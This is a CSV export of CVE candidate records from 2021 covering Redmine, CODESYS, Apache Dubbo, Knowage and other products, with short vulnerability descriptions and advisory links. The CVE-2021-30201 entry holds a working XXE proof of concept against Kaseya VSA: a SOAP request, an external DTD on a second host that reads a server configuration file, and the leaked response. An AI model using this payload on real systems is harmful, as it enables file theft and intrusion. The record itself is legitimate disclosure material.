"Name","Status","Description","References","Phase","Votes","Comments"
CVE-2021-30163,Candidate,"Redmine before 4.0.8 and 4.1.x before 4.1.2 allows attackers to discover the names of private projects if issue-journal details exist that have changes to project_id values.","MISC:https://www.redmine.org/projects/redmine/wiki/Security_Advisories   |   MLIST:[debian-lts-announce] 20210513 [SECURITY] [DLA 2658-1] redmine security update   |   URL:https://lists.debian.org/debian-lts-announce/2021/05/msg00013.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30164,Candidate,"Redmine before 4.0.8 and 4.1.x before 4.1.2 allows attackers to bypass the add_issue_notes permission requirement by leveraging the Issues API.","MISC:https://www.redmine.org/projects/redmine/wiki/Security_Advisories   |   MLIST:[debian-lts-announce] 20210513 [SECURITY] [DLA 2658-1] redmine security update   |   URL:https://lists.debian.org/debian-lts-announce/2021/05/msg00013.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30165,Candidate,"The default administrator account & password of the EDIMAX wireless network camera is hard-coded. Remote attackers can disassemble firmware to obtain the privileged permission and further control the devices.","MISC:https://www.twcert.org.tw/tw/cp-132-4670-359c8-1.html   |   URL:https://www.twcert.org.tw/tw/cp-132-4670-359c8-1.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30166,Candidate,"The NTP Server configuration function of the IP camera device is not verified with special parameters. Remote attackers can perform a command Injection attack and execute arbitrary commands after logging in with the privileged permission.","MISC:https://gist.github.com/keniver/86ebef688fb274b534da51ef1a84dd3e   |   URL:https://gist.github.com/keniver/86ebef688fb274b534da51ef1a84dd3e   |   MISC:https://www.chtsecurity.com/news/0b733a38-e616-4ff3-86a6-13e710643388   |   URL:https://www.chtsecurity.com/news/0b733a38-e616-4ff3-86a6-13e710643388   |   MISC:https://www.meritlilin.com/assets/uploads/support/file/M00166-TW.pdf   |   URL:https://www.meritlilin.com/assets/uploads/support/file/M00166-TW.pdf   |   MISC:https://www.twcert.org.tw/tw/cp-132-4676-391a5-1.html   |   URL:https://www.twcert.org.tw/tw/cp-132-4676-391a5-1.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30167,Candidate,"The manage users profile services of the network camera device allows an authenticated. Remote attackers can modify URL parameters and further amend user&#8217;s information and escalate privileges to control the devices.","MISC:https://gist.github.com/keniver/86ebef688fb274b534da51ef1a84dd3e   |   URL:https://gist.github.com/keniver/86ebef688fb274b534da51ef1a84dd3e   |   MISC:https://www.chtsecurity.com/news/0b733a38-e616-4ff3-86a6-13e710643388   |   URL:https://www.chtsecurity.com/news/0b733a38-e616-4ff3-86a6-13e710643388   |   MISC:https://www.meritlilin.com/assets/uploads/support/file/M00166-TW.pdf   |   URL:https://www.meritlilin.com/assets/uploads/support/file/M00166-TW.pdf   |   MISC:https://www.twcert.org.tw/tw/cp-132-4676-391a5-1.html   |   URL:https://www.twcert.org.tw/tw/cp-132-4676-391a5-1.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30168,Candidate,"The sensitive information of webcam device is not properly protected. Remote attackers can unauthentically grant administrator&#8217;s credential and further control the devices.","MISC:https://gist.github.com/keniver/86ebef688fb274b534da51ef1a84dd3e   |   URL:https://gist.github.com/keniver/86ebef688fb274b534da51ef1a84dd3e   |   MISC:https://www.chtsecurity.com/news/0b733a38-e616-4ff3-86a6-13e710643388   |   URL:https://www.chtsecurity.com/news/0b733a38-e616-4ff3-86a6-13e710643388   |   MISC:https://www.meritlilin.com/assets/uploads/support/file/M00166-TW.pdf   |   URL:https://www.meritlilin.com/assets/uploads/support/file/M00166-TW.pdf   |   MISC:https://www.twcert.org.tw/tw/cp-132-4678-aad70-1.html   |   URL:https://www.twcert.org.tw/tw/cp-132-4678-aad70-1.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30169,Candidate,"The sensitive information of webcam device is not properly protected. Remote attackers can unauthentically grant user&#8217;s credential.","MISC:https://gist.github.com/keniver/86ebef688fb274b534da51ef1a84dd3e   |   URL:https://gist.github.com/keniver/86ebef688fb274b534da51ef1a84dd3e   |   MISC:https://www.chtsecurity.com/news/0b733a38-e616-4ff3-86a6-13e710643388   |   URL:https://www.chtsecurity.com/news/0b733a38-e616-4ff3-86a6-13e710643388   |   MISC:https://www.meritlilin.com/assets/uploads/support/file/M00166-TW.pdf   |   URL:https://www.meritlilin.com/assets/uploads/support/file/M00166-TW.pdf   |   MISC:https://www.twcert.org.tw/tw/cp-132-4679-d308c-1.html   |   URL:https://www.twcert.org.tw/tw/cp-132-4679-d308c-1.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-3017,Candidate,"The web interface on Intelbras WIN 300 and WRN 342 devices through 2021-01-04 allows remote attackers to discover credentials by reading the def_wirelesspassword line in the HTML source code.","MISC:https://pastebin.com/cTYTf0Yn   |   MISC:https://www.intelbras.com/pt-br/ajuda-download/faq/roteador-wireless-veloz-wrn-342",Assigned (20210104),"None (candidate not yet proposed)",""
CVE-2021-30170,Candidate,"Special characters of ERP POS customer profile page are not filtered in users&#8217; input, which allow remote authenticated attackers can inject malicious JavaScript and carry out stored XSS (Stored Cross-site scripting) attacks, additionally access and manipulate customer&#8217;s information.","MISC:https://www.twcert.org.tw/tw/cp-132-4707-9c87e-1.html   |   URL:https://www.twcert.org.tw/tw/cp-132-4707-9c87e-1.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30171,Candidate,"Special characters of ERP POS news page are not filtered in users&#8217; input, which allow remote authenticated attackers can inject malicious JavaScript and carry out stored XSS (Stored Cross-site scripting) attacks, additionally access and manipulate customer&#8217;s information.","MISC:https://www.twcert.org.tw/tw/cp-132-4707-9c87e-1.html   |   URL:https://www.twcert.org.tw/tw/cp-132-4707-9c87e-1.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30172,Candidate,"Special characters of picture preview page in the Quan-Fang-Wei-Tong-Xun system are not filtered in users&#8217; input, which allow remote authenticated attackers can inject malicious JavaScript and carry out Reflected XSS (Cross-site scripting) attacks, additionally access and manipulate customer&#8217;s information.","MISC:https://www.twcert.org.tw/tw/cp-132-4711-04469-1.html   |   URL:https://www.twcert.org.tw/tw/cp-132-4711-04469-1.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30173,Candidate,"Local File Inclusion vulnerability of the omni-directional communication system allows remote authenticated attacker inject absolute path into Url parameter and access arbitrary file.","MISC:https://www.twcert.org.tw/tw/cp-132-4712-7ade4-1.html   |   URL:https://www.twcert.org.tw/tw/cp-132-4712-7ade4-1.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30174,Candidate,"RiyaLab CloudISO event item is added, special characters in specific field of time management page are not properly filtered, which allow remote authenticated attackers can inject malicious JavaScript and carry out stored XSS (Stored Cross-site scripting) attacks.","MISC:https://www.twcert.org.tw/tw/cp-132-4718-f16df-1.html   |   URL:https://www.twcert.org.tw/tw/cp-132-4718-f16df-1.html",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30175,Candidate,"ZEROF Web Server 1.0 (April 2021) allows SQL Injection via the /HandleEvent endpoint for the login page.","MISC:https://github.com/awillix/research/blob/main/cve/CVE-2021-30175.md   |   MISC:https://pro.zerof.ru",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30176,Candidate,"The ZEROF Expert pro/2.0 application for mobile devices allows SQL Injection via the Authorization header to the /v2/devices/add endpoint.","MISC:https://github.com/awillix/research/blob/main/cve/CVE-2021-30176.md   |   MISC:https://pro.zerof.ru",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30177,Candidate,"There is a SQL Injection vulnerability in PHP-Nuke 8.3.3 in the User Registration section, leading to remote code execution. This occurs because the U.S. state is not validated to be two letters, and the OrderBy field is not validated to be one of LASTNAME, CITY, or STATE.","MISC:https://gist.github.com/stacksmasher007/41e946fc9a5a2f0b6950626cc9d43d47",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30178,Candidate,"An issue was discovered in the Linux kernel through 5.11.11. synic_get in arch/x86/kvm/hyperv.c has a NULL pointer dereference for certain accesses to the SynIC Hyper-V context, aka CID-919f4ebc5987.","FEDORA:FEDORA-2021-57a7ba61f8   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TGQDVYCDM3F5VXUZIADIV2ERL3AJXNJS/   |   FEDORA:FEDORA-2021-8b64847a44   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IJ5GEETMX3ERQ4DF3GSS2XPNSOOK44OB/   |   FEDORA:FEDORA-2021-e71c033f88   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W5YFGIIF24475A2LNW3UWHW2SNCS3G7M/   |   MISC:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=919f4ebc598701670e80e31573a58f1f2d2bf918",Assigned (20210406),"None (candidate not yet proposed)",""
CVE-2021-30179,Candidate,"Apache Dubbo prior to 2.6.9 and 2.7.9 by default supports generic calls to arbitrary methods exposed by provider interfaces. These invocations are handled by the GenericFilter which will find the service and method specified in the first arguments of the invocation and use the Java Reflection API to make the final call. The signature for the $invoke or $invokeAsync methods is Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object; where the first argument is the name of the method to invoke, the second one is an array with the parameter types for the method being invoked and the third one is an array with the actual call arguments. In addition, the caller also needs to set an RPC attachment specifying that the call is a generic call and how to decode the arguments. The possible values are: - true - raw.return - nativejava - bean - protobuf-json An attacker can control this RPC attachment and set it to nativejava to force the java deserialization of the byte array located in the third argument.","MISC:https://lists.apache.org/thread.html/rccbcbdd6593e42ea3a1e8fedd12807cb111375c9c40edb005ef36f67%40%3Cdev.dubbo.apache.org%3E   |   URL:https://lists.apache.org/thread.html/rccbcbdd6593e42ea3a1e8fedd12807cb111375c9c40edb005ef36f67%40%3Cdev.dubbo.apache.org%3E   |   MLIST:[dubbo-dev] 20210531 [CVE-2021-30179]Pre-auth RCE via Java deserialization in the Generic filter   |   URL:https://lists.apache.org/thread.html/rccbcbdd6593e42ea3a1e8fedd12807cb111375c9c40edb005ef36f67@%3Cdev.dubbo.apache.org%3E",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-3018,Candidate,"ipeak Infosystems ibexwebCMS (aka IPeakCMS) 3.5 is vulnerable to an unauthenticated Boolean-based SQL injection via the id parameter on the /cms/print.php page.","MISC:http://packetstormsecurity.com/files/160815/IPeakCMS-3.5-SQL-Injection.html   |   MISC:https://github.com/M4DM0e/m4dm0e.github.io/blob/gh-pages/_posts/2020-12-07-ipeak-cms-sqli.md   |   MISC:https://ipeak.ch   |   MISC:https://m4dm0e.github.io/2020/12/07/ipeak-cms-sqli.html   |   MISC:https://www.amario.ch/cms/",Assigned (20210105),"None (candidate not yet proposed)",""
CVE-2021-30180,Candidate,"Apache Dubbo prior to 2.7.9 support Tag routing which will enable a customer to route the request to the right server. These rules are used by the customers when making a request in order to find the right endpoint. When parsing these YAML rules, Dubbo customers may enable calling arbitrary constructors.","MISC:https://lists.apache.org/thread.html/raed526465e56204030ddf374b1959478a290e7511971d7aba2e9e39b%40%3Cdev.dubbo.apache.org%3E   |   URL:https://lists.apache.org/thread.html/raed526465e56204030ddf374b1959478a290e7511971d7aba2e9e39b%40%3Cdev.dubbo.apache.org%3E",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30181,Candidate,"Apache Dubbo prior to 2.6.9 and 2.7.9 supports Script routing which will enable a customer to route the request to the right server. These rules are used by the customers when making a request in order to find the right endpoint. When parsing these rules, Dubbo customers use ScriptEngine and run the rule provided by the script which by default may enable executing arbitrary code.","MISC:https://lists.apache.org/thread.html/re22410dc704a09bc7032ddf15140cf5e7df3e8ece390fc9032ff5587%40%3Cdev.dubbo.apache.org%3E   |   URL:https://lists.apache.org/thread.html/re22410dc704a09bc7032ddf15140cf5e7df3e8ece390fc9032ff5587%40%3Cdev.dubbo.apache.org%3E",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30182,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30183,Candidate,"Cleartext storage of sensitive information in multiple versions of Octopus Server where in certain situations when running import or export processes, the password used to encrypt and decrypt sensitive values would be written to the logs in plaintext.","MISC:https://advisories.octopus.com/adv/2021-03---Cleartext-Storage-of-Sensitive-Information-(CVE-2021-30183).1817083941.html   |   MISC:https://github.com/OctopusDeploy/Issues",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30184,Candidate,"GNU Chess 6.2.7 allows attackers to execute arbitrary code via crafted PGN (Portable Game Notation) data. This is related to a buffer overflow in the use of a .tmp.epd temporary file in the cmd_pgnload and cmd_pgnreplay functions in frontend/cmd.cc.","FEDORA:FEDORA-2021-2c714d311f   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QC74RWMDLSQGV6Z3ZABNTPABB33S4YNF/   |   FEDORA:FEDORA-2021-a58cb9bc7a   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XXOTMUSBVUZNA3JMPG6BU37DQW2YOJWS/   |   FEDORA:FEDORA-2021-ff3297913b   |   URL:https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SOGPLC77ZL2FACSOE5MWDS3YH3RBNQAQ/   |   GENTOO:GLSA-202107-28   |   URL:https://security.gentoo.org/glsa/202107-28   |   MISC:https://lists.gnu.org/archive/html/bug-gnu-chess/2021-04/msg00000.html   |   MISC:https://lists.gnu.org/archive/html/bug-gnu-chess/2021-04/msg00001.html",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30185,Candidate,"CERN Indico before 2.3.4 can use an attacker-supplied Host header in a password reset link.","MISC:https://github.com/indico/indico/releases/tag/v2.3.4   |   MISC:https://www.shorebreaksecurity.com/blog/",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30186,Candidate,"CODESYS V2 runtime system SP before 2.4.7.55 has a Heap-based Buffer Overflow.","MISC:https://customers.codesys.com/index.php   |   MISC:https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=14725&token=08691519ef764b252630759eff925890176ecd78&download=",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30187,Candidate,"CODESYS V2 runtime system SP before 2.4.7.55 has Improper Neutralization of Special Elements used in an OS Command.","MISC:https://customers.codesys.com/index.php   |   MISC:https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=14727&token=25159b0fc4355f4c6bc2e074a519a9d0cdb23fbb&download=",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30188,Candidate,"CODESYS V2 runtime system SP before 2.4.7.55 has a Stack-based Buffer Overflow.","MISC:https://customers.codesys.com/index.php   |   MISC:https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=14725&token=08691519ef764b252630759eff925890176ecd78&download=",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30189,Candidate,"CODESYS V2 Web-Server before 1.1.9.20 has a Stack-based Buffer Overflow.","MISC:https://customers.codesys.com/index.php   |   MISC:https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=14726&token=553da5d11234bbe1ceed59969d419a71bb8c8747&download=",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-3019,Candidate,"ffay lanproxy 0.1 allows Directory Traversal to read /../conf/config.properties to obtain credentials for a connection to the intranet.","MISC:https://github.com/ffay/lanproxy/commits/master   |   MISC:https://github.com/maybe-why-not/lanproxy/issues/1",Assigned (20210105),"None (candidate not yet proposed)",""
CVE-2021-30190,Candidate,"CODESYS V2 Web-Server before 1.1.9.20 has Improper Access Control.","MISC:https://customers.codesys.com/index.php   |   MISC:https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=14726&token=553da5d11234bbe1ceed59969d419a71bb8c8747&download=",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30191,Candidate,"CODESYS V2 Web-Server before 1.1.9.20 has a a Buffer Copy without Checking the Size of the Input.","MISC:https://customers.codesys.com/index.php   |   MISC:https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=14726&token=553da5d11234bbe1ceed59969d419a71bb8c8747&download=",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30192,Candidate,"CODESYS V2 Web-Server before 1.1.9.20 has an Improperly Implemented Security Check.","MISC:https://customers.codesys.com/index.php   |   MISC:https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=14726&token=553da5d11234bbe1ceed59969d419a71bb8c8747&download=",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30193,Candidate,"CODESYS V2 Web-Server before 1.1.9.20 has an Out-of-bounds Write.","MISC:https://customers.codesys.com/index.php   |   MISC:https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=14726&token=553da5d11234bbe1ceed59969d419a71bb8c8747&download=",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30194,Candidate,"CODESYS V2 Web-Server before 1.1.9.20 has an Out-of-bounds Read.","MISC:https://customers.codesys.com/index.php   |   MISC:https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=14726&token=553da5d11234bbe1ceed59969d419a71bb8c8747&download=",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30195,Candidate,"CODESYS V2 runtime system before 2.4.7.55 has Improper Input Validation.","MISC:https://customers.codesys.com/index.php   |   MISC:https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=14725&token=08691519ef764b252630759eff925890176ecd78&download=",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30196,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30197,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30198,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30199,Candidate,"In filters/reframe_latm.c in GPAC 1.0.1 there is a Null Pointer Dereference, when gf_filter_pck_get_data is called. The first arg pck may be null with a crafted mp4 file,which results in a crash.","MISC:https://github.com/gpac/gpac/commit/b2db2f99b4c30f96e17b9a14537c776da6cb5dca   |   MISC:https://github.com/gpac/gpac/issues/1728",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-3020,Candidate,"An issue was discovered in ClusterLabs Hawk (aka HA Web Konsole) through 2.3.0-15. It ships the binary hawk_invoke (built from tools/hawk_invoke.c), intended to be used as a setuid program. This allows the hacluster user to invoke certain commands as root (with an attempt to limit this to safe combinations). This user is able to execute an interactive ""shell"" that isn't limited to the commands specified in hawk_invoke, allowing escalation to root.","MISC:https://bugzilla.suse.com/show_bug.cgi?id=1180571   |   MISC:https://github.com/ClusterLabs/crmsh/commit/c538024b8ebd138dc373b005189471d9b77e9c82   |   MISC:https://github.com/ClusterLabs/hawk/releases",Assigned (20210105),"None (candidate not yet proposed)",""
CVE-2021-30200,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30201,Candidate,"The API /vsaWS/KaseyaWS.asmx can be used to submit XML to the system. When this XML is processed (external) entities are insecurely processed and fetched by the system and returned to the attacker. Detailed description Given the following request: ``` POST /vsaWS/KaseyaWS.asmx HTTP/1.1 Content-Type: text/xml;charset=UTF-8 Host: 192.168.1.194:18081 Content-Length: 406 <soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:kas=""KaseyaWS""> <soapenv:Header/> <soapenv:Body> <kas:PrimitiveResetPassword> <!--type: string--> <kas:XmlRequest><![CDATA[<!DOCTYPE data SYSTEM ""http://192.168.1.170:8080/oob.dtd""><data>&send;</data>]]> </kas:XmlRequest> </kas:PrimitiveResetPassword> </soapenv:Body> </soapenv:Envelope> ``` And the following XML file hosted at http://192.168.1.170/oob.dtd: ``` <!ENTITY % file SYSTEM ""file://c:\\kaseya\\kserver\\kserver.ini""> <!ENTITY % eval ""<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>""> %eval; %error; ``` The server will fetch this XML file and process it, it will read the file c:\\kaseya\\kserver\\kserver.ini and returns the content in the server response like below. Response: ``` HTTP/1.1 500 Internal Server Error Cache-Control: private Content-Type: text/xml; charset=utf-8 Date: Fri, 02 Apr 2021 10:07:38 GMT Strict-Transport-Security: max-age=63072000; includeSubDomains Connection: close Content-Length: 2677 <?xml version=""1.0"" encoding=""utf-8""?><soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema""><soap:Body><soap:Fault><faultcode>soap:Server</faultcode><faultstring>Server was unable to process request. ---&gt; There is an error in XML document (24, -1000).\r\n\r\nSystem.Xml.XmlException: Fragment identifier '######################################################################## # This is the configuration file for the KServer. # Place it in the same directory as the KServer executable # A blank line or new valid section header [] terminates each section. # Comment lines start with ; or # ######################################################################## <snip> ``` Security issues discovered --- * The API insecurely resolves external XML entities * The API has an overly verbose error response Impact --- Using this vulnerability an attacker can read any file on the server the webserver process can read. Additionally, it can be used to perform HTTP(s) requests into the local network and thus use the Kaseya system to pivot into the local network.","CONFIRM:https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/   |   URL:https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/   |   CONFIRM:https://csirt.divd.nl/CVE-2021-30201   |   URL:https://csirt.divd.nl/CVE-2021-30201   |   CONFIRM:https://csirt.divd.nl/DIVD-2021-00011   |   URL:https://csirt.divd.nl/DIVD-2021-00011   |   CONFIRM:https://helpdesk.kaseya.com/hc/en-gb/articles/360019966738-9-5-6-Feature-Release-8-May-2021   |   URL:https://helpdesk.kaseya.com/hc/en-gb/articles/360019966738-9-5-6-Feature-Release-8-May-2021",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30202,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30203,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30204,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30205,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30206,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30207,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30208,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30209,Candidate,"Textpattern V4.8.4 contains an arbitrary file upload vulnerability where a plug-in can be loaded in the background without any security verification, which may lead to obtaining system permissions.","MISC:https://github.com/textpattern/textpattern/issues/1655",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-3021,Candidate,"ISPConfig before 3.2.2 allows SQL injection.","MISC:https://twitter.com/ispconfig/status/1346142615511724032   |   MISC:https://www.ispconfig.org/blog/ispconfig-3-2-2-released-important-security-update/",Assigned (20210105),"None (candidate not yet proposed)",""
CVE-2021-30210,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30211,Candidate,"Knowage Suite 7.3 is vulnerable to Stored Cross-Site Scripting (XSS). An attacker can inject arbitrary web script in '/knowage/restful-services/signup/update' via the 'surname' parameter.","MISC:https://github.com/piuppi/Proof-of-Concepts/blob/main/Engineering/Stored-XSS-KnowageSuite7-3-surname.md",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30212,Candidate,"Knowage Suite 7.3 is vulnerable to Stored Cross-Site Scripting (XSS). An attacker can inject arbitrary web script in '/knowage/restful-services/documentnotes/saveNote' via the 'nota' parameter.","MISC:https://github.com/piuppi/Proof-of-Concepts/blob/main/Engineering/Stored-XSS-KnowageSuite7-3-notes.md",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30213,Candidate,"Knowage Suite 7.3 is vulnerable to unauthenticated reflected cross-site scripting (XSS). An attacker can inject arbitrary web script in '/servlet/AdapterHTTP' via the 'targetService' parameter.","MISC:https://github.com/piuppi/Proof-of-Concepts/blob/main/Engineering/XSS-KnowageSuite7-3_unauth.md",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30214,Candidate,"Knowage Suite 7.3 is vulnerable to Stored Client-Side Template Injection in '/knowage/restful-services/signup/update' via the 'name' parameter.","MISC:https://github.com/piuppi/Proof-of-Concepts/blob/main/Engineering/CSTI-KnowageSuite7-3.md",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30215,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30216,Candidate,"** REJECT ** DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: none. Reason: This candidate was withdrawn by its CNA. Further investigation showed that it was not a security issue in a customer-controlled product. Notes: none.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30217,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30218,Candidate,"samurai 1.2 has a NULL pointer dereference in writefile() in util.c via a crafted build file.","MISC:https://github.com/michaelforney/samurai/commit/e84b6d99c85043fa1ba54851ee500540ec206918   |   MISC:https://github.com/michaelforney/samurai/issues/67",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-30219,Candidate,"samurai 1.2 has a NULL pointer dereference in printstatus() function in build.c via a crafted build file.","MISC:https://github.com/michaelforney/samurai/commit/d2af3bc375e2a77139c3a28d6128c60cd8d08655   |   MISC:https://github.com/michaelforney/samurai/issues/68",Assigned (20210407),"None (candidate not yet proposed)",""
CVE-2021-3022,Candidate,"An issue was discovered on LG mobile devices with Android OS 10 software. There was no write protection for the MTK protect2 partition. The LG ID is LVE-SMP-200028 (January 2021).","MISC:https://lgsecurity.lge.com/",Assigned (20210105),"None (candidate not yet proposed)",""
CVE-2021-30220,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210407),"None (candidate not yet proposed)",""
